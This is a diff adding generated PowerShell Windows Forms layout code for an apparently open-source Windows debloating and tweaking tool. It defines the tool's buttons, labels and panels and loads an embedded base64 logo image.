@@ -1,0 +1,976 @@
+#region Generated Form Objects
+
+[System.Windows.Forms.Application]::EnableVisualStyles()
+$Ps = New-Object 'System.Windows.Forms.Form'
+$panelMenu = New-Object 'System.Windows.Forms.Panel'
+$panelOptimization = New-Object 'System.Windows.Forms.Panel'
+$panelRemovalSection = New-Object 'System.Windows.Forms.Panel'
+$panelsysset = New-Object 'System.Windows.Forms.Panel'
+$panelrestore = New-Object 'System.Windows.Forms.Panel'
+$panelAbout = New-Object 'System.Windows.Forms.Panel'
+$picturebox2 = New-Object 'System.Windows.Forms.PictureBox'
+$btnOfficialSite = New-Object 'System.Windows.Forms.Button'
+$Laboutdes = New-Object 'System.Windows.Forms.Label'
+$LAbout = New-Object 'System.Windows.Forms.Label'
+$btnResetWindowsUpdate = New-Object 'System.Windows.Forms.Button'
+$btnDisNewNinterest = New-Object 'System.Windows.Forms.Button'
+$btnDiskCleanup = New-Object 'System.Windows.Forms.Button'
+$btnDisWebsearch = New-Object 'System.Windows.Forms.Button'
+$btnEnNewNinterest = New-Object 'System.Windows.Forms.Button'
+$btnEnWebsearch = New-Object 'System.Windows.Forms.Button'
+$btnDisNetPer = New-Object 'System.Windows.Forms.Button'
+$btnDisActivityHistory = New-Object 'System.Windows.Forms.Button'
+$btnEnNetPer = New-Object 'System.Windows.Forms.Button'
+$btnEnActivityHistory = New-Object 'System.Windows.Forms.Button'
+$btnDisBackgroundApps = New-Object 'System.Windows.Forms.Button'
+$btnDisActionCenter = New-Object 'System.Windows.Forms.Button'
+$btnEnBackgroundApps = New-Object 'System.Windows.Forms.Button'
+$btnEnActionCenter = New-Object 'System.Windows.Forms.Button'
+$btnUndoTimerResolutio = New-Object 'System.Windows.Forms.Button'
+$btnBalancedMode = New-Object 'System.Windows.Forms.Button'
+$btnSetTimerResolution = New-Object 'System.Windows.Forms.Button'
+$btnUltraPowerMode = New-Object 'System.Windows.Forms.Button'
+$btnDefaultAnimation = New-Object 'System.Windows.Forms.Button'
+$btnDisCortana = New-Object 'System.Windows.Forms.Button'
+$btnQuickAnimation = New-Object 'System.Windows.Forms.Button'
+$btnLightMode = New-Object 'System.Windows.Forms.Button'
+$btnEnCortana = New-Object 'System.Windows.Forms.Button'
+$btnDarkMode = New-Object 'System.Windows.Forms.Button'
+$btnDisPowerThrottli = New-Object 'System.Windows.Forms.Button'
+$btnEnPowerThrottlin = New-Object 'System.Windows.Forms.Button'
+$LNewNinterest = New-Object 'System.Windows.Forms.Label'
+$LNetPerformance = New-Object 'System.Windows.Forms.Label'
+$LUserActivityHistory = New-Object 'System.Windows.Forms.Label'
+$LPowerThrottlingLimit = New-Object 'System.Windows.Forms.Label'
+$LResetUpdate = New-Object 'System.Windows.Forms.Label'
+$LTimerResolution = New-Object 'System.Windows.Forms.Label'
+$LPowerMode = New-Object 'System.Windows.Forms.Label'
+$LBackgroundApps = New-Object 'System.Windows.Forms.Label'
+$LStartmenuWebsearch = New-Object 'System.Windows.Forms.Label'
+$LActionCenter = New-Object 'System.Windows.Forms.Label'
+$LSystemSettings = New-Object 'System.Windows.Forms.Label'
+$btnRestore = New-Object 'System.Windows.Forms.Button'
+$btnCreateRestorePoint = New-Object 'System.Windows.Forms.Button'
+$LRestoreDescript = New-Object 'System.Windows.Forms.Label'
+$LRestore = New-Object 'System.Windows.Forms.Label'
+$LBackupRestoreDescript = New-Object 'System.Windows.Forms.Label'
+$LBackupRestore = New-Object 'System.Windows.Forms.Label'
+$Ldebloat = New-Object 'System.Windows.Forms.Label'
+$btnMsStoreReinstall = New-Object 'System.Windows.Forms.Button'
+$btnMsStoreRemove = New-Object 'System.Windows.Forms.Button'
+$LCompletelyRemoveMicr = New-Object 'System.Windows.Forms.Label'
+$btnOneDriveReinstall = New-Object 'System.Windows.Forms.Button'
+$btnOneDriveRemove = New-Object 'System.Windows.Forms.Button'
+$LRemovingOneDriveWill = New-Object 'System.Windows.Forms.Label'
+$btnBloatwareReinstall = New-Object 'System.Windows.Forms.Button'
+$btnBloatwareRemove = New-Object 'System.Windows.Forms.Button'
+$LItsRecommandedToRemo = New-Object 'System.Windows.Forms.Label'
+$LMsStore = New-Object 'System.Windows.Forms.Label'
+$LOneDrive = New-Object 'System.Windows.Forms.Label'
+$LBloatware = New-Object 'System.Windows.Forms.Label'
+$LRemovalSection = New-Object 'System.Windows.Forms.Label'
+$btnSetServicesToManual = New-Object 'System.Windows.Forms.Button'
+$LService = New-Object 'System.Windows.Forms.Label'
+$LOptimization = New-Object 'System.Windows.Forms.Label'
+$btnRevert = New-Object 'System.Windows.Forms.Button'
+$btnOptimize = New-Object 'System.Windows.Forms.Button'
+$LOptimizedescription = New-Object 'System.Windows.Forms.Label'
+$btnAbout = New-Object 'System.Windows.Forms.Button'
+$btnBackupRestore = New-Object 'System.Windows.Forms.Button'
+$btnSystemSettings = New-Object 'System.Windows.Forms.Button'
+$btnRemovalSection = New-Object 'System.Windows.Forms.Button'
+$btnOptimization = New-Object 'System.Windows.Forms.Button'
+$panelLogo = New-Object 'System.Windows.Forms.Panel'
+$picturebox1 = New-Object 'System.Windows.Forms.PictureBox'
+#endregion Generated Form Objects
+
+
+
+#----------------------------------------------
+#region Generated Form Code
+#----------------------------------------------
+#
+# picturebox2
+#
+#region Binary Data
+$Imagebase64 = 'AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0uRHJhd2luZywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EFAQAAABVTeXN0ZW0uRHJhd2luZy5CaXRtYXABAAAABERhdGEHAgIAAAAJAwAAAA8DAAAANw8AAAKJUE5HDQoaCgAAAA1JSERSAAAAtAAAAD4IBgAAAILmMYwAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAA6/AAAOvwE4BVMkAAAO2UlEQVR4Xu2df4weRR3G6/VoMZBGkIqV/kFEqRhNtEYNkbR37/Uo5UcLJlCLR3uIGCnQu/fuaGl7LQ3FxDRaUUNICAG0sb2+hdRGaTExUqPUf8QSQ2uV971rqIaKQo9gDFhIfZ7Z78w7Ozt779vbvfd613mSJ/vuzOzM7Luf+e7sj/duSt5asuTG81pbCjNlNShoYqvQ2vYgfLOsBgVNXC1oa/8sovMwvFaSgoImrhCZfwqYT8HbJCkoaGKqrbBgGUB+h0AXWgt/RLS+QLLGRKvXrJ1276ribPgySQoKykeAdzqi82GJzvRbWM8FtGLPfTO6unsvW9XVU4DvgrfC+wDyK/BbtBQNCspHiM53WzBrt0h23dqyZWtTd7FvDoC9CV4LWJ/A8gWY4J5Kc7HY91GpIigom6679vpzAW/FgRnTjrZ7pEhCPb2rz0XUnQ14vwJY74efBpgvu6DWa9TVLlUHBWUXAN7nAfoRyTbq7VtzPuDdDQgr8LANZRajzpXSRFBQdgHeTS7Q8HOSHRMAfNEFMrO7ij+Q6oOCsgtA3+AB+q/XXL3og1LECADuSACZ0YjQe1evWTdNmggKyiYA/QkP0G/gYvHzUsQIAG52gczBZcyjZ0kTQUHZBYDVPWjbAL1Dso26ir3tHiAzG1F6rjQRFJRdAPhlF2h4k2QbdRf7zvMBmdUAeqk0ERSUXYjGuz1Aex+BA8BXXSCzGkD3S/UN0dd2DF3auXvoQ7KaqzoGKg93DJSfj1x5WJKDGinAm7jTAcj/LNkx3dvV80sflFkMoEtSfUwdOyubbttZORV3eb9kKxFOXzrFNHvbjh1DLab8QGVIiuWqW0tDn2M7aX0KaoAAcIcLNPyOZMcEALe6QObgF6V6rxDpjhIQwihJRreVyp0aWF/UVfkD5Z/L6hSWIWhjHT0D0OOotsKCLwNgvjoagxpRerYUMUI0vcsDZFb/HfPz1ClAx87yUwoQwClJRoRVA49yN0qykdrWs91YKwA9jgK4/KXK31ygAfoCKWIEoAseILP63a7u3k9KEwkRVAWIFWm1MC0ZxvShW4B+SpKNmO+L7PWI04fbSkPza823VdRHOVqSagKtt2EbkjRm0vtBj/a7mHAC1L/2AL1Oso2KPffxtU8flJkMoBPRVSuaJhCQyglJUlLzVURnk+/MiyX/JVmdUp3bRpbkRDoHEAbCQTuNg0aKx8SpS7RNZZhtsQ8KILVdEmgCxbqjs4qa+ryEsifss4vbH5ppkq3PWLHvIl4+apffi1ycqrZUe+wn2p/0YAPoH7lAw89KdkyI0q/5oMxi1Pl9qd6r6IBUTtkRDQdmE4FSnyMwUvNt6bpk1Yjlmc66NEARFP45vClvnRn0IGK6BkuL2yP9BPNZryRj2hSdYdxBo9r1XLyi3WHVrgU5pUC36tDTMbst1T9C7Ww76QR4Vzow0+UFbe3nShEjwMc37Lxgjtao8zdSvVf6oBMiSVIQ68im4YodUBWRkvPqOoCODQKTbkEgZwVE1sqwJBlVL1TjQEtkTYBIKXhRnw0f+8Hy8UGKs4cMME8/Y9Mr5OP7qRyUVSNuZ9c5KYUIvdAD9DCmHb4Lw/t9UGb0ManeKx4AdRDlAAlQBkqdryFy823VBNqNfFhX6fZgkjTvvF7nOUBHaSl9Qj2qDatts88WuDoKK6it6C2gm+kVpetEuScn/RTDFcDlOx3vOkDzTkfisTSAvskDZGb39a1JnA1sMQLxAClYndtxlJ3PA+yDjcoFaF3WSrPFPBtoPcDYR0mKKa2+JLhRFNbRXkdaDboqJIqmONG+KqMebP/AWQE3wJ0BgI+5QMPJdzq6e68AgCddILMa9X5JmvBKH0TC7DuAOh9LXNQl87XGE2hakmJKq0/vE8FV+yVRmJ9VeYne2C71bo7aFuVYRvpwQg+ESatbbl7aBKj/4gKNtM1SxAjwzYCP2TBm9KuI+nvhK6UJr/TclAeZkcs9KCafBw/5aQc4F6AlzYZWKy1PAyWrMfmmHJQNroLbGqSqPhV1k9ONNHH7tH5PSBUKbc240PsYpxKtrYVbAe1GfN6P5X9skC17H0sDvkc9YI5kRvTXsN0huAT3wwtXr1l3nlRZU1aU452Co5JsVCtfKw+go2mNAjR2+4xKg0YBqerxPQBSt9OGWa8kGal2AC7bsgdptb7KQRt0Leb5IrFqq84BcMbp6vaFlwLKWwHtD7F8Dj4Cvwn74E0Y2/1Yqoqpq6tnGoBMfeEfeUPwdrgLU4nrurp6L7+3q+dC2XzU4oEQKBIPUSiTb11IucoDaEqXB0xPSpJcyOl5axxoPQjggza47KsqjzOMJMVkwHUg5MCI2kl5LYB5Vt+oqH8jfz9njABfCyAsYvkTRN8D+PxvG85R+D1cLC6W6r0CsFcB4H54Ez7fwXlwd7FvhmTnLgOdJ8pRGg5fvgYz7gi69HQNZ9VM1zJQ0zz9y1TILm8PEIIndeIsUn5ebaMg9+8PZcD1RGG1bUq0xXZPMT/qV/QGoOpPSjA4owTwZgLANxwgs/oJDI7ET7GCkiK0vtP7SOI2afP8PMV+sS17YJ3Ruv76G5oB3jYPkKN1Gb4HbpYmgoIaJ5lqnBQY6zXLH4cPY/vH4E547qJF154v1Y6pOkuDH8Hp71MrSpXO5Tsrj8AH4OHlpUqPFAk6G9XefvWFgPKQQOoz714chX8LPw5o74cXw3Pgi5YsvrFJqspdt+8anA5gZ3eWKl8EvB3wd+ABgHsIy3/B78Fmrkkj7zHZPGiSSU19ZC5Pe6dogLIo4GpzurAH6d/D8ptYtlyzcFFD/twW4L0YUC5AlF3FqIvPv8LyVRvYOvy8VNcQxS7q/Ob7Gg/4bqdNZKmL01LtV2PzlLrLw7m8vmvjm9MD2q2Adh3cvnTpsnH5+xYrSoOXANxn0Mn/WSCM1mVMRxoOj76bIatG1bsmyZd8JrL0QB6PC8XxbLumAN+H0bkj7GBOfht1zpPqG6Y0oCneFlN9S7lPPBE16YGe2tJ/edP89Td9YN76tfAT8O/g5+CVcOp9ZXTsTnWwczSi/R1SfcNUA+goSnseRqh7zg38JYieKpxOe7qPtCTVDRWnCe62I6me/uUG9PS2jdMB56zm1g1fwLIDfggegA/Bx+H34VOOT8K/gL2PqNGxbexcngbQ35XqG6YRgdZzPhwISWIaH3aol/W5LZZHkX/QvtDRB862ZCkhnw9UzEMOHmC7bKy9KC9qbyB6cT/RXmJ7vuMRPUzR/vr2IXksn7Tdnprv7izvZh+j7yb6frD+gBSJKdY/+T74QMd34cd2VF2nCzQgnDl1fv88RN5ufN4Fl+E3YBfamm6a3++FDB0rsXN5GkDvkeobpjSgVYSK3qMwB6D6kpQDQDQ1ib1voaIjyzrRXQYE9zfxLgghsuvQoNrwR/2KXmhyo6EBRsEfPV1kGdar96EWVASStuu2X/6SJCVf/yjdPxfqWm0nBAAXAuK3XCgz+jimJRdJE0bLS5WH2LmcfUSqb5g00Pr0Si8fGFpiHhfLQVQgMRIBDrWhpbQDSzA4KGRViWVUOsrHo3ryzTldjm1LklJqexoYa8BRBFIDOhJUOk8PBlv6e4oNuJT+sYxqA9+hJCmN1LZXgHmuB8is5nTkM9KEEaIp7y/7oMzik3c+M3iONNEQGaDVsmoFnvXFa4iYJ0kx6X2QVSUccM9PqaL3N5jOfElGOqY3Fkg6wo/YXmKw1AZmpDLRvvvzzHZYcr1W/zg4mW/DXk//YppW2DjDgTEvJ15UWlEavDLaoXy9olS5XJpoiPRBlNVUETaW0wfUlY5WdgTTB12Da0dh1KNeHuJniuux6GcGEOen1YcS2pLnzs0zAa365NSpVZ1uRWeFav/SBlxycNTTv4QA31EHxsxG5N8g1RsBvEvQuRPRTuVnTGUa+g9AxxJoSkEi4NpRWH1GeUJvg66lgWE6P6dZiivVA8xIZVRfkSerMY0n0Lzl5gVztG6atz7xZw34eBudK0c7lZ8xldkiTTRE9QJd+wBG/ZdVozi41ShMiJnO6K3KOPNWPQ9Na8+nrED7INQy22HJ9TqmHIn5dT39SwjRdIsPyox+XaqPCdH02Win8jOA/r1U3xDVCzQPjByk5N0JgV1HL1sG3J3qj8w4L+pH0Zt1upGdYnlu6150UdFAicNUDzBuGbZLOPlZn4XcwUXp78nuZ1r/0gbjqICeOr+fD0l8UGZyc8uGi6UJI8C3Nup4rv7HN55u3CPweoGmNJw44ObXIAp0wmpFX1fMk+1ioERQ4gA7oGvpgWK3R5lB4oBRDzBuGbSNC9cqeAJp7Me0tW7buf3L7bYdBfgug9+xYczDU1v6E0+MEKEXqh3K1//FQPm4NDFm0l+u61pfNmFSgCKyysUZriPK+9NgpjS4bhlrgCQiopaaqvDMIO2hbfXnxLitFLGmQ7X3xZxpqvXF/poS880Pd3V70f56+8ht7fqiZeUlG2Z//+qcSiGS8k7HMRfIrMZUJvFv2G7fVZmd7Gh244Iz8ccizzQRTh4o33RgLKRARHtu1ButFIg1+n867en+jcn3gYu4F31QZvRWqT4mAPi2C2RWI/KH/2EYVBWA5nsaPihHbdS5V6qPCQD+yQUyB3sHT9BZKgDY7wKZg8tSfUyAb7sDY2ZjDr1Pqg8KUkAvc2DMxVJ9TABwswtkDj4k1QcF8V50/1i808E371qlCSPMd2/xAFmvX0c0fgF+HJ+LqGsxPGfVnqGpUn1QkLrTMatp/vpXfFBm9IPShBEA/DRg/KcFqev34ePwYXgPym9ZUap8tXPX4EypIihoZCGSNgO+PQ6Mefhn0oTRt54ZmgZQ7Z9ivQn/AVH3yRWlwbsB8BX4fNEdTw+O2a/Mg84CNc1bv9UDZFZ7/w0boC0g6l4FaMP/7g4aGyFKf9sD5OmaP8PiT7QOwyV4FaO/NBEU1DgBvhbYB+lIfh0+AGi3YVnEPHwxPs+54NrNAeKg8dU5rRtmWaC6JrhHACyj7kpAe9W0wsZwkRZ0ZouPwOUxOCMuH7Ysm9rSPxcgz2xu3RCiblBQUFBQUFCqpkz5P1BbnSi5JgBeAAAAAElFTkSuQmCCCw=='
+$Formatter_binaryFomatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+$System_IO_MemoryStream = New-Object System.IO.MemoryStream (,[byte[]][System.Convert]::FromBase64String($Imagebase64))
+#endregion
+$picturebox2.Image = $Formatter_binaryFomatter.Deserialize($System_IO_MemoryStream)
+$Formatter_binaryFomatter = $null
+$System_IO_MemoryStream = $null
+$picturebox2.Location = New-Object System.Drawing.Point(215, 108)
+$picturebox2.Name = 'picturebox2'
+$picturebox2.Size = New-Object System.Drawing.Size(190, 84)
+$picturebox2.SizeMode = 'CenterImage'
+$picturebox2.TabStop = $False
+#
+# buttonOfficialSite
+#
+$btnOfficialSite.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnOfficialSite.FlatAppearance.BorderSize = 0
+$btnOfficialSite.FlatStyle = 'Flat'
+$btnOfficialSite.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnOfficialSite.Location = New-Object System.Drawing.Point(392, 388)
+$btnOfficialSite.Name = 'buttonOfficialSite'
+$btnOfficialSite.Size = New-Object System.Drawing.Size(146, 27)
+$btnOfficialSite.Text = 'Visit GitHub'
+$btnOfficialSite.UseVisualStyleBackColor = $False
+#
+# labelaboutdes
+#
+$Laboutdes.FlatStyle = 'Flat'
+$Laboutdes.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '9.75')
+$Laboutdes.Location = New-Object System.Drawing.Point(39, 225)
+$Laboutdes.Name = 'labelaboutdes'
+$Laboutdes.RightToLeft = 'No'
+$Laboutdes.Size = New-Object System.Drawing.Size(520, 150)
+$Laboutdes.Text = 'Windows powertool is designed to provide one click solution to reduce and trim down unnecessary burden that comes by default with windows. 
+
+From user prospective most things are useless like Ads, Telemetry which is microsoft data collection services, Bloatware which are preinstalled sponsored apps, User activity history, diagnostic tracking services, Cortana and many more.
+
+Its Open Source and free to use. Not for sale.
+For more information. Please visit GitHub Repo.'
+#
+# labelAbout
+#
+$LAbout.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$LAbout.Dock = 'Top'
+$LAbout.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '12')
+$LAbout.Location = New-Object System.Drawing.Point(0, 0)
+$LAbout.Name = 'labelAbout'
+$LAbout.Size = New-Object System.Drawing.Size(607, 70)
+$LAbout.Text = 'About'
+$LAbout.TextAlign = 'MiddleCenter'
+#
+# buttonResetWindowsUpdate
+#
+$btnResetWindowsUpdate.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnResetWindowsUpdate.FlatAppearance.BorderSize = 0
+$btnResetWindowsUpdate.FlatStyle = 'Flat'
+$btnResetWindowsUpdate.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnResetWindowsUpdate.Location = New-Object System.Drawing.Point(367, 789)
+$btnResetWindowsUpdate.Name = 'buttonResetWindowsUpdate'
+$btnResetWindowsUpdate.Size = New-Object System.Drawing.Size(177, 27)
+$btnResetWindowsUpdate.Text = 'Reset Windows Update'
+$btnResetWindowsUpdate.UseVisualStyleBackColor = $False
+#
+# buttonDisableNewsAndInterest
+#
+$btnDisNewNinterest.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDisNewNinterest.FlatAppearance.BorderSize = 0
+$btnDisNewNinterest.FlatStyle = 'Flat'
+$btnDisNewNinterest.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDisNewNinterest.Location = New-Object System.Drawing.Point(459, 700)
+$btnDisNewNinterest.Name = 'buttonDisableNewsAndInterest'
+$btnDisNewNinterest.Size = New-Object System.Drawing.Size(86, 27)
+$btnDisNewNinterest.Text = 'Disable'
+$btnDisNewNinterest.UseVisualStyleBackColor = $False
+#
+# buttonDiskCleanup
+#
+$btnDiskCleanup.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDiskCleanup.FlatAppearance.BorderSize = 0
+$btnDiskCleanup.FlatStyle = 'Flat'
+$btnDiskCleanup.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDiskCleanup.Location = New-Object System.Drawing.Point(367, 757)
+$btnDiskCleanup.Name = 'buttonDiskCleanup'
+$btnDiskCleanup.Size = New-Object System.Drawing.Size(177, 27)
+$btnDiskCleanup.Text = 'Disk Cleanup'
+$btnDiskCleanup.UseVisualStyleBackColor = $False
+#
+# buttonDisableStartmenuWebsearch
+#
+$btnDisWebsearch.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDisWebsearch.FlatAppearance.BorderSize = 0
+$btnDisWebsearch.FlatStyle = 'Flat'
+$btnDisWebsearch.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDisWebsearch.Location = New-Object System.Drawing.Point(458, 491)
+$btnDisWebsearch.Name = 'buttonDisableStartmenuWebsearch'
+$btnDisWebsearch.Size = New-Object System.Drawing.Size(86, 27)
+$btnDisWebsearch.Text = 'Disable'
+$btnDisWebsearch.UseVisualStyleBackColor = $False
+#
+# buttonEnableNewsAndInterest
+#
+$btnEnNewNinterest.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnEnNewNinterest.FlatAppearance.BorderSize = 0
+$btnEnNewNinterest.FlatStyle = 'Flat'
+$btnEnNewNinterest.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnEnNewNinterest.Location = New-Object System.Drawing.Point(367, 700)
+$btnEnNewNinterest.Name = 'buttonEnableNewsAndInterest'
+$btnEnNewNinterest.Size = New-Object System.Drawing.Size(86, 27)
+$btnEnNewNinterest.Text = 'Enable'
+$btnEnNewNinterest.UseVisualStyleBackColor = $False
+#
+# buttonEnableStartmenuWebsearch
+#
+$btnEnWebsearch.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnEnWebsearch.FlatAppearance.BorderSize = 0
+$btnEnWebsearch.FlatStyle = 'Flat'
+$btnEnWebsearch.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnEnWebsearch.Location = New-Object System.Drawing.Point(366, 491)
+$btnEnWebsearch.Name = 'buttonEnableStartmenuWebsearch'
+$btnEnWebsearch.Size = New-Object System.Drawing.Size(86, 27)
+$btnEnWebsearch.Text = 'Enable'
+$btnEnWebsearch.UseVisualStyleBackColor = $False
+#
+# buttonDisableNetPerformance
+#
+$btnDisNetPer.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDisNetPer.FlatAppearance.BorderSize = 0
+$btnDisNetPer.FlatStyle = 'Flat'
+$btnDisNetPer.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDisNetPer.Location = New-Object System.Drawing.Point(459, 668)
+$btnDisNetPer.Name = 'buttonDisableNotifications'
+$btnDisNetPer.Size = New-Object System.Drawing.Size(86, 27)
+$btnDisNetPer.Text = 'Disable'
+$btnDisNetPer.UseVisualStyleBackColor = $False
+#
+# buttonDisableActivityHistory
+#
+$btnDisActivityHistory.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDisActivityHistory.FlatAppearance.BorderSize = 0
+$btnDisActivityHistory.FlatStyle = 'Flat'
+$btnDisActivityHistory.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDisActivityHistory.Location = New-Object System.Drawing.Point(458, 459)
+$btnDisActivityHistory.Name = 'buttonDisableActivityHistory'
+$btnDisActivityHistory.Size = New-Object System.Drawing.Size(86, 27)
+$btnDisActivityHistory.Text = 'Disable'
+$btnDisActivityHistory.UseVisualStyleBackColor = $False
+#
+# buttonEnableNetPerformance
+#
+$btnEnNetPer.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnEnNetPer.FlatAppearance.BorderSize = 0
+$btnEnNetPer.FlatStyle = 'Flat'
+$btnEnNetPer.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnEnNetPer.Location = New-Object System.Drawing.Point(367, 668)
+$btnEnNetPer.Name = 'buttonEnableNotifications'
+$btnEnNetPer.Size = New-Object System.Drawing.Size(86, 27)
+$btnEnNetPer.Text = 'Enable'
+$btnEnNetPer.UseVisualStyleBackColor = $False
+#
+# buttonEnableActivityHistory
+#
+$btnEnActivityHistory.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnEnActivityHistory.FlatAppearance.BorderSize = 0
+$btnEnActivityHistory.FlatStyle = 'Flat'
+$btnEnActivityHistory.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnEnActivityHistory.Location = New-Object System.Drawing.Point(366, 459)
+$btnEnActivityHistory.Name = 'buttonEnableActivityHistory'
+$btnEnActivityHistory.Size = New-Object System.Drawing.Size(86, 27)
+$btnEnActivityHistory.Text = 'Enable'
+$btnEnActivityHistory.UseVisualStyleBackColor = $False
+#
+# buttonDisableBackgroundApps
+#
+$btnDisBackgroundApps.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDisBackgroundApps.FlatAppearance.BorderSize = 0
+$btnDisBackgroundApps.FlatStyle = 'Flat'
+$btnDisBackgroundApps.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDisBackgroundApps.Location = New-Object System.Drawing.Point(459, 635)
+$btnDisBackgroundApps.Name = 'buttonDisableBackgroundApps'
+$btnDisBackgroundApps.Size = New-Object System.Drawing.Size(86, 27)
+$btnDisBackgroundApps.Text = 'Disable'
+$btnDisBackgroundApps.UseVisualStyleBackColor = $False
+#
+# buttonDisableActionCenter
+#
+$btnDisActionCenter.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnDisActionCenter.FlatAppearance.BorderSize = 0
+$btnDisActionCenter.FlatStyle = 'Flat'
+$btnDisActionCenter.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnDisActionCenter.Location = New-Object System.Drawing.Point(458, 426)
+$btnDisActionCenter.Name = 'buttonDisableActionCenter'
+$btnDisActionCenter.Size = New-Object System.Drawing.Size(86, 27)
+$btnDisActionCenter.Text = 'Disable'
+$btnDisActionCenter.UseVisualStyleBackColor = $False
+#
+# buttonEnableBackgroundApps
+#
+$btnEnBackgroundApps.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnEnBackgroundApps.FlatAppearance.BorderSize = 0
+$btnEnBackgroundApps.FlatStyle = 'Flat'
+$btnEnBackgroundApps.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnEnBackgroundApps.Location = New-Object System.Drawing.Point(367, 635)
+$btnEnBackgroundApps.Name = 'buttonEnableBackgroundApps'
+$btnEnBackgroundApps.Size = New-Object System.Drawing.Size(86, 27)
+$btnEnBackgroundApps.Text = 'Enable'
+$btnEnBackgroundApps.UseVisualStyleBackColor = $False
+#
+# buttonEnableActionCenter
+#
+$btnEnActionCenter.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnEnActionCenter.FlatAppearance.BorderSize = 0
+$btnEnActionCenter.FlatStyle = 'Flat'
+$btnEnActionCenter.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnEnActionCenter.Location = New-Object System.Drawing.Point(366, 426)
+$btnEnActionCenter.Name = 'buttonEnableActionCenter'
+$btnEnActionCenter.Size = New-Object System.Drawing.Size(86, 27)
+$btnEnActionCenter.Text = 'Enable'
+$btnEnActionCenter.UseVisualStyleBackColor = $False
+#
+# buttonRevertTimerResolutio
+#
+$btnUndoTimerResolutio.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnUndoTimerResolutio.FlatAppearance.BorderSize = 0
+$btnUndoTimerResolutio.FlatStyle = 'Flat'
+$btnUndoTimerResolutio.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnUndoTimerResolutio.Location = New-Object System.Drawing.Point(367, 578)
+$btnUndoTimerResolutio.Name = 'buttonRevertTimerResolutio'
+$btnUndoTimerResolutio.Size = New-Object System.Drawing.Size(177, 27)
+$btnUndoTimerResolutio.Text = 'Undo Timer Resolution'
+$btnUndoTimerResolutio.UseVisualStyleBackColor = $False
+#
+# buttonBalancedMode
+#
+$btnBalancedMode.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnBalancedMode.FlatAppearance.BorderSize = 0
+$btnBalancedMode.FlatStyle = 'Flat'
+$btnBalancedMode.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnBalancedMode.Location = New-Object System.Drawing.Point(366, 372)
+$btnBalancedMode.Name = 'buttonBalancedMode'
+$btnBalancedMode.Size = New-Object System.Drawing.Size(177, 27)
+$btnBalancedMode.Text = 'Balanced mode'
+$btnBalancedMode.UseVisualStyleBackColor = $False
+#
+# buttonSetTimerResolution
+#
+$btnSetTimerResolution.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnSetTimerResolution.FlatAppearance.BorderSize = 0
+$btnSetTimerResolution.FlatStyle = 'Flat'
+$btnSetTimerResolution.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnSetTimerResolution.Location = New-Object System.Drawing.Point(367, 546)
+$btnSetTimerResolution.Name = 'buttonSetTimerResolution'
+$btnSetTimerResolution.Size = New-Object System.Drawing.Size(177, 27)
+$btnSetTimerResolution.Text = 'Set Timer Resolution'
+$btnSetTimerResolution.UseVisualStyleBackColor = $False
+#
+# buttonUltraPowerMode
+#
+$btnUltraPowerMode.BackColor = [System.Drawing.Color]::FromArgb(255, 95, 182, 232)
+$btnUltraPowerMode.FlatAppearance.BorderSize = 0
+$btnUltraPowerMode.FlatStyle = 'Flat'
+$btnUltraPowerMode.Font = [System.Drawing.Font]::new('Microsoft Sans Serif', '11.25')
+$btnUltraPowerMode.Location = New-Object System.Drawing.Point(366, 340)
+$btnUltraPowerMode.Name = 'buttonUltraPowerMode'
+$btnUltraPowerMode.Size = New-Object System.Drawing.Size(177, 27)
+$btnUltraPowerMode.Text = 'ultra power mode'
+$btnUltraPowerMode.UseVisualStyleBackColor = $False
+#
